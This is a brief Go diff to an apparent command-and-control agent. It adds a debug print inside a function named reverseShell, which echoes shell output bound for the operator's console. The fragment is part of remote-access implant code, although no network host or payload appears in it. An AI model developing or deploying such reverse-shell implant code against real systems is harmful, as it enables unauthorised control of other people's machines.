@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -144,6 +145,7 @@ func reverseShell(send chan<- []byte, recv <-chan []byte, finished *bool, pid *i
 	for {
 		buf := make([]byte, BufSize)
 		_, err = shellf.Read(buf)
+		fmt.Printf("%s", buf) // echo CC's console
 		send <- buf
 		if err != nil {
 			log.Print("shell read: ", err)
